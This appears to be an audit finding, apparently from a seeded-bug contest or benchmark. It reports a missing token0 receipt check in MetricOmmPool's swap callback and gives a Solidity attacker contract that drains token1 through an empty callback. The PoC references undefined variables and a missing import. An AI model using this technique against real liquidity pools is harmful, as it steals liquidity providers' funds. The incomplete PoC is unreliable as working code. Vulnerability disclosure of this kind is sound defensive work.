### Title
Missing Token0 Receipt Verification in Swap Callback Allows Free Token1 Extraction — (`metric-core/contracts/MetricOmmPool.sol`)

---

### Summary

The `swap` function in `MetricOmmPool.sol` only verifies that the pool received `token1` after the swap callback, but never verifies receipt of `token0`. When `zeroForOne = true`, the pool is owed `token0` from the caller's callback, yet no balance check enforces this. A malicious caller can implement `metricOmmSwapCallback` without transferring `token0`, receive `token1` for free, and drain the pool.

---

### Finding Description

After executing swap math and invoking the caller's callback, the pool performs the following guard:

```solidity
uint256 balance1Before = balance1();
IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
// forge-lint: disable-next-line(unsafe-typecast)
if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
    revert IncorrectDelta();
}
``` [1](#0-0) 

The guard captures only `balance1Before` and checks only the `amount1Delta > 0` branch (i.e., the `zeroForOne = false` direction where the pool receives `token1`). There is no symmetric capture of `balance0Before` and no check of the form:

```solidity
if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
    revert IncorrectDelta();
}
```

When `zeroForOne = true`:
- `amount0Delta > 0` — the pool is owed `token0` from the callback
- `amount1Delta < 0` — the pool sends `token1` to the recipient
- The guard condition `amount1Delta > 0` evaluates to **false**, so the entire check is skipped
- No enforcement of `token0` receipt occurs

This is structurally identical to the seeded bug: a condition that should gate on the relevant direction instead always evaluates to the wrong branch, leaving one direction completely unguarded.

---

### Impact Explanation

A malicious swapper calling `swap(zeroForOne=true, ...)` can implement `metricOmmSwapCallback` to send zero `token0`. The pool will:
1. Compute the correct output of `token1` and transfer it to `recipient`
2. Call the callback (which sends nothing)
3. Skip the `IncorrectDelta` check because `amount1Delta < 0`
4. Complete successfully

The pool loses `token1` with no corresponding `token0` received. Repeated calls drain the entire `token1` reserve, causing pool insolvency and complete loss of LP principal in `token1`.

This matches the allowed impact gate: **Swap conservation failure** (pool fails to receive owed input) and **pool insolvency** (balances fail to cover LP claims).

---

### Likelihood Explanation

Any unprivileged address can call `swap` directly. The only prerequisite is deploying a contract that implements `IMetricOmmSwapCallback` with an empty or no-op callback body. No special role, governance action, or malicious pool setup is required. The attack is immediately executable on any pool with `token1` liquidity.

---

### Recommendation

Capture `balance0Before` before the callback and add a symmetric check for `amount0Delta > 0`:

```solidity
uint256 balance0Before = balance0();
uint256 balance1Before = balance1();

IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);

if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
    revert IncorrectDelta();
}
if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
    revert IncorrectDelta();
}
```

This mirrors the pattern used in Uniswap v3 and ensures both token directions are enforced after the callback.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmSwapCallback} from "metric-core/contracts/interfaces/IMetricOmmSwapCallback.sol";

contract MaliciousSwapper is IMetricOmmSwapCallback {
    IMetricOmmPool pool;
    address token1;

    constructor(address _pool, address _token1) {
        pool = IMetricOmmPool(_pool);
        token1 = _token1;
    }

    function attack() external {
        // zeroForOne=true: pool owes us token1, we owe pool token0
        // amountSpecified > 0 = exact input of token0 (which we never send)
        pool.swap(
            address(this),   // recipient of token1
            true,            // zeroForOne
            1e18,            // amountSpecified (token0 we claim to send)
            0,               // priceLimitX64 (no limit)
            bidPriceX64,
            askPriceX64,
            ""
        );
        // We now hold token1 without having sent any token0
    }

    // Callback: send nothing — no token0 transferred to pool
    function metricOmmSwapCallback(
        int256 /*amount0Delta*/,
        int256 /*amount1Delta*/,
        bytes calldata /*data*/
    ) external override {
        // Intentionally empty — pool never receives token0
    }
}
```

After `attack()` completes without revert, `token1.balanceOf(address(this))` is nonzero and the pool's `token1` reserve is reduced by the swap output, with no `token0` received in return.

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L271-277)
```text
      uint256 balance1Before = balance1();
      IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
      // casting to uint256 is safe because amount1Delta is positive and the ammount of tokens in pool is capped by uint128.max
      // forge-lint: disable-next-line(unsafe-typecast)
      if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
        revert IncorrectDelta();
      }
```
